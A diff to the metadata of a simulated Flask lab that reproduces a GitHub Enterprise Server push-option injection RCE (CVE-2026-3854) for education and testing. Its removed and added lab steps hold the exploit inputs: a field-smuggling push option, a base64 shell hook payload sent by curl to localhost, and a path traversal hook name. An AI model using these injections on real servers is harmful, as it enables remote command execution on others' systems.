@@ -4,7 +4,7 @@
     "info": {
       "name": "GitHub Enterprise Server - X-Stat Field Injection to Pre-Receive Hook RCE",
       "author": "omarkurt",
-      "description": "GitHub Enterprise Server versions up to and including 3.19.1 are affected\nby a remote code execution vulnerability (CVE-2026-3854) in the internal\ngit protocol. babeld copies git push-option values directly into the\ninternal X-Stat header without sanitizing ';', the header's field\ndelimiter. An authenticated user with push access can inject a single\npush option value containing extra fields (rails_env=development,\ncustom_hooks_dir, repo_pre_receive_hooks) that disable the pre-receive\nhook sandbox and redirect hook resolution to an attacker-controlled,\npath-traversed location, resulting in arbitrary command execution as the\ngit service user via a single `git push -o` command. GitHub.com was also\naffected and was patched within 6 hours of report. This package ships a\nsimulated HTTP lab: GHES is closed-source commercial software, so the\nreal babeld / pre-receive binaries cannot be obtained or redistributed.\nThe lab reproduces the exact vulnerable parsing and hook-resolution\nlogic described in the advisory over a small Flask harness.\n",
+      "description": "\u26a0\ufe0f  NOTE: This is a SIMULATED vulnerability environment using Python/Flask.\nThe actual GitHub Enterprise Server (babeld / pre-receive binaries) is NOT\nincluded \u2014 GHES is closed-source commercial software and cannot be\nredistributed. The lab emulates the exact vulnerable X-Stat parsing and\nhook-resolution behavior described in the advisory for educational purposes.\n\nGitHub Enterprise Server versions up to and including 3.19.1 are affected\nby a remote code execution vulnerability (CVE-2026-3854) in the internal\ngit protocol. babeld copies git push-option values directly into the\ninternal X-Stat header without sanitizing ';', the header's field\ndelimiter. An authenticated user with push access can inject a single\npush option value containing extra fields (rails_env=development,\ncustom_hooks_dir, repo_pre_receive_hooks) that disable the pre-receive\nhook sandbox and redirect hook resolution to an attacker-controlled,\npath-traversed location, resulting in arbitrary command execution as the\ngit service user via a single `git push -o` command. GitHub.com was also\naffected and was patched within 6 hours of report.\n",
       "type": "CVE",
       "targets": [
         "github-enterprise-server"
@@ -66,10 +66,10 @@
       "docker compose up -d",
       "Wait for the healthcheck to pass (a few seconds)",
       "Banner: curl http://localhost:8385/",
-      "Auth token (simulated push credential): demo-user-push-token-123 -- required on every /internal/git-receive call, else 401",
-      "Baseline (safe, no injection): curl -X POST http://localhost:8385/internal/git-receive -H 'Content-Type: application/json' -H 'Authorization: Bearer demo-user-push-token-123' -d '{\"push_options\":[\"id=abc123\"]}'",
-      "Exploit: curl -X POST http://localhost:8385/internal/git-receive -H 'Content-Type: application/json' -H 'Authorization: Bearer demo-user-push-token-123' -d '{\"push_options\":[\"id=abc123;rails_env=development;custom_hooks_dir=/tmp/evil;repo_pre_receive_hooks=pwn.sh\"],\"hook_payload\":\"IyEvYmluL3NoCmVjaG8gVlRfMjAyNl8zODU0X1BXTkVEXyQoaWQgLXUpXyQod2hvYW1pKQo=\"}'",
-      "Path traversal alone (no custom_hooks_dir): repo_pre_receive_hooks=../../../tmp/x.sh escapes /srv/hooks/safe entirely",
+      "Auth: every POST /internal/git-receive needs header 'Authorization: Bearer demo-user-push-token-123', otherwise 401",
+      "Baseline (no injection): POST /internal/git-receive with push_options ['id=abc123'] -> sandboxed:true, executed:false",
+      "Exploit: put ';rails_env=development;custom_hooks_dir=/tmp/evil;repo_pre_receive_hooks=pwn.sh' inside one push option, plus a base64 hook_payload -> sandboxed:false, executed:true (full request: see the Exploit Chain above and the nuclei PoC)",
+      "Path traversal alone: repo_pre_receive_hooks=../../../tmp/x.sh escapes /srv/hooks/safe",
       "nuclei -t vt-2026-3854.nuclei.yaml -u http://localhost:8385"
     ],
     "category": "cves",
